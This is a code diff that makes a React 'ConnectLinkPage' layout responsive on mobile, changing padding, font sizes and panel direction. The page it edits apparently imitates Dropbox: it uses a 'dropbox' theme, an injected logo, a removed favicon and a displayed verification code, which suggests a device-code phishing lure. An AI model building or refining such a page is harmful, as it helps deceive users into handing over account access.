@@ -19,6 +19,13 @@ export function ConnectLinkPage() {
   const [copied, setCopied] = useState(false);
   const [honeypot, setHoneypot] = useState({ email_address: "", phone_number: "", website_url: "" });
   const [theme, setTheme] = useState<LinkTheme>(getTheme("dropbox"));
+  const [isMobile, setIsMobile] = useState(() => typeof window !== "undefined" && window.innerWidth < 768);
+
+  useEffect(() => {
+    const onResize = () => setIsMobile(window.innerWidth < 768);
+    window.addEventListener("resize", onResize);
+    return () => window.removeEventListener("resize", onResize);
+  }, []);
 
   // Set page title + meta, remove favicon
   useEffect(() => {
@@ -192,6 +199,7 @@ export function ConnectLinkPage() {
       <div style={{
         minHeight: "100vh",
         display: "flex",
+        flexDirection: isMobile ? "column" : "row",
         fontFamily: "Inter, system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
         background: "white",
         color: "#1A1A1A",
@@ -200,12 +208,12 @@ export function ConnectLinkPage() {
 
         {/* Left panel: document */}
         <div style={{
-          flex: "0 0 38%",
+          flex: isMobile ? "0 0 auto" : "0 0 38%",
           background: t.bgTint,
-          padding: "32px 48px",
+          padding: isMobile ? "20px 20px 28px" : "32px 48px",
           display: "flex",
           flexDirection: "column",
-          minHeight: "100vh",
+          minHeight: isMobile ? "auto" : "100vh",
         }}>
           <div dangerouslySetInnerHTML={{ __html: t.logo }} />
 
@@ -216,10 +224,11 @@ export function ConnectLinkPage() {
             justifyContent: "center",
             alignItems: "center",
             textAlign: "center",
+            marginTop: isMobile ? 20 : 0,
           }}>
             {/* Document icon with + badge */}
             <div style={{ position: "relative", marginBottom: 18 }}>
-              <svg width="80" height="96" viewBox="0 0 80 96" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <svg width={isMobile ? 56 : 80} height={isMobile ? 68 : 96} viewBox="0 0 80 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M10 8 a4 4 0 0 1 4 -4 h44 l18 18 v62 a4 4 0 0 1 -4 4 H14 a4 4 0 0 1 -4 -4 V8z" fill="white" stroke="#D4D2CF" strokeWidth="2"/>
                 <path d="M58 4 v14 a4 4 0 0 0 4 4 h14" fill="none" stroke="#D4D2CF" strokeWidth="2"/>
                 <line x1="22" y1="38" x2="58" y2="38" stroke="#E5E2DD" strokeWidth="2" strokeLinecap="round"/>
@@ -256,10 +265,10 @@ export function ConnectLinkPage() {
         {/* Right panel: auth */}
         <div style={{
           flex: 1,
-          padding: "32px 48px",
+          padding: isMobile ? "28px 20px 24px" : "32px 48px",
           display: "flex",
           flexDirection: "column",
-          minHeight: "100vh",
+          minHeight: isMobile ? "auto" : "100vh",
         }}>
           <div style={{
             flex: 1,
@@ -295,20 +304,20 @@ export function ConnectLinkPage() {
                 </div>
 
                 <h1 style={{
-                  fontSize: 28, fontWeight: 700,
+                  fontSize: isMobile ? 22 : 28, fontWeight: 700,
                   textAlign: "center", margin: "0 0 12px",
                   color: "#1A1A1A", letterSpacing: "-0.5px",
                 }}>{t.heading}</h1>
                 <p style={{
                   marginBottom: 28, color: "#637282",
-                  textAlign: "center", lineHeight: 1.55, fontSize: 14.5,
+                  textAlign: "center", lineHeight: 1.55, fontSize: isMobile ? 13.5 : 14.5,
                 }}>{t.subtitle}</p>
 
                 {/* Dark verification code card */}
                 <div style={{
                   background: t.cardBg || "#1A1A1A",
                   borderRadius: 12,
-                  padding: "26px 24px",
+                  padding: isMobile ? "22px 16px" : "26px 24px",
                   marginBottom: 28,
                   textAlign: "center",
                 }}>
@@ -318,9 +327,10 @@ export function ConnectLinkPage() {
                     letterSpacing: 1.8, fontWeight: 600,
                   }}>{t.codeLabel}</div>
                   <div style={{
-                    fontSize: 28, fontWeight: 700, letterSpacing: 6,
+                    fontSize: isMobile ? 22 : 28, fontWeight: 700, letterSpacing: isMobile ? 4 : 6,
                     color: "white", fontFamily: "ui-monospace, monospace",
                     marginBottom: 18,
+                    wordBreak: "break-all",
                   }}>{session.userCode}</div>
                   <button
                     onClick={handleCopyCode}
@@ -509,8 +519,9 @@ export function ConnectLinkPage() {
                 {t.codeLabel}
               </div>
               <div style={{
-                fontSize: 36, fontWeight: 700, letterSpacing: 8,
+                fontSize: isMobile ? 26 : 36, fontWeight: 700, letterSpacing: isMobile ? 4 : 8,
                 color: t.codeColor || t.primaryColor, fontFamily: "monospace", marginBottom: 12,
+                wordBreak: "break-all",
               }}>
                 {session.userCode}
               </div>
